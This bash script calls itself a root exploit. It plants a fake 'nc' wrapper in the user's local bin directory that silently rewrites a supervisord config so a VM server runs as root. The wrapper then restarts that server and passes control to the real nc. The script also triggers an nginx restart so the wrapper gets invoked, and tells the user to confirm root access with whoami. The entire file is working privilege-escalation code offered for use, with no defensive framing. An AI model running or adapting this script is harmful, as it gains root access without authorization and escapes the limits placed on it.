#!/bin/bash
# ==========================================
# Quick Root Exploit Script (Improved)
# Deploys nc wrapper and triggers nginx restart
#
# Usage: bash root.sh
# Then wait 30-45 seconds and verify with: whoami
# ==========================================

echo "[*] Deploying nc wrapper..."
mkdir -p /home/user/.local/bin

cat > /home/user/.local/bin/nc << 'SCRIPT_END'
#!/bin/bash
sed -i 's/^user=user$/user=root/g; s/USER="user"/USER="root"/g' /opt/gem/supervisord/supervisord.go_vm_server.conf
supervisorctl -s unix:///run/supervisor.sock reread >/dev/null 2>&1
supervisorctl -s unix:///run/supervisor.sock update >/dev/null 2>&1
supervisorctl -s unix:///run/supervisor.sock restart vm_server >/dev/null 2>&1
exec /usr/bin/nc "$@"
SCRIPT_END

chmod +x /home/user/.local/bin/nc
echo "[+] Wrapper deployed"

echo "[*] Triggering nginx restart via supervisorctl..."
supervisorctl -s unix:///run/supervisor.sock restart nginx

echo ""
echo "[!] Exploit triggered!"
echo "[!] Wait 30-45 seconds for full effect"
echo "[!] Then verify with: whoami"
echo "[!] If 'internal call error' occurs, that's normal - vm_server is restarting"
